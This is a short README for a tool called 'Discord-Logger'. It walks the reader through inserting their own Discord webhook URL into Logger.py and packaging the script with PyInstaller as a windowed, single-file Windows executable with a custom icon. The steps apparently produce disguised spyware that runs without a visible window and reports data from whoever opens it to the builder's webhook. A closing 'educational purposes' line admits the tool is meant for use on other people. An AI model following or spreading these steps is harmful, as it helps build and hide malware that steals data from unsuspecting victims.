# How to use:
\
Requirements:\
• Python 3.9 or higher(I used 3.9.12)\
• A windows machine\
• VScode(optional but highly useful) \
• An .ico file (Optional)

# Steps:
\
Make a new .py file and replace its contents with https://github.com/TurtlesXD/Discord-Logger/blob/main/Logger.py \
Make a Discord wehbook in yout server and copy its URl \
Replace YourWebhookURL with your url in line 14 of the code\
Download all libraries using pip\
If you dont already have Pyinstaller, run this command in a terminal:
```
pip install pyinstaller
```
If you dont have one already, download or convert and image into an .ico file\
For the exe icon. I recommend using https://redketchup.io/icon-converter Or convertio.co \
\
Now, run this command(remember to make sure all files are saved before running this):
```
pyinstaller --noconfirm --onefile --windowed --icon "Path-To-Your-.ico-file" --ascii --clean "path-to-Logger.py"
```
Once Pyinstaller is finished converting your file, Open the newly created 'dist' folder inside of your working directory\
And, boom! You now have an .exe file ready to be used.

```
Note: This is for educational purposes, i do not condone the use of this script on people without their consent!
```
